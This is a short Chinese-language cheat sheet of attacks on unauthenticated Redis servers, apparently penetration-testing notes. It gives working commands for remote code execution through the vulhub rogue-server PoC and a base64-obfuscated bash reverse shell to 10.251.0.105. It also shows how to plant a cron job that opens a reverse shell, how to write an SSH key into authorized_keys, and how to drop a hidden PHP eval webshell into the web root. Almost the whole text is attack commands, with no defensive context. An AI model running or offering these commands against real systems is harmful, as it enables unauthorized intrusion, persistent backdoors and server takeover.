# 1.Redis未授权

 [Redis未授权Poc](https://github.com/vulhub/redis-rogue-getshell)

1.获取Poc

> git clone https://github.com/vulhub/redis-rogue-getshell.git

2.编译

> cd redis-rogue-getshell
>
> make

3.执行命令

> python3 redis-master.py -r 10.251.0.189 -p 6379 -L 10.251.0.105 -P 8888 -f RedisModulesSDK/exp.so -c "id"

4.反弹shell

> python3 redis-master.py -r 10.251.0.189 -p 6379 -L 10.251.0.105 -P 8888 -f RedisModulesSDK/exp.so -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yNTEuMC4xMDUvODgwMCAwPiYxCg==|base64 -d|bash"

# 2.写计划任务

1.连接Redis服务器

> redis-cli -h ip 

2.在Redis中执行

> set x "\n * * * * * bash -i >& /dev/tcp/10.251.0.105/8888 0>&1\n"
>
> config set dir /etc/cron.d/
>
> config set dbfilename root
>
> save

3.监听端口

> nc -lp 8888

# 3.写ssh-keygen公钥

1.生成ssh公钥

> ssh-keygen -t rsa

2.将id_rsa.pub写到服务器

> config set dir /ssh/.ssh
>
> config set dbfilename authorized_keys
>
> set x "\n\n[is_rsa.pub内容]\n\n"
>
> save

3.ssh连接服务器

> ssh username@ip

# 4.web路径写webshell

> config set dir /var/www/html/
>
> config set dbfilename .shell.php
>
> set x "<?php eval($_REQUEST['ant']);?>"
>
> save

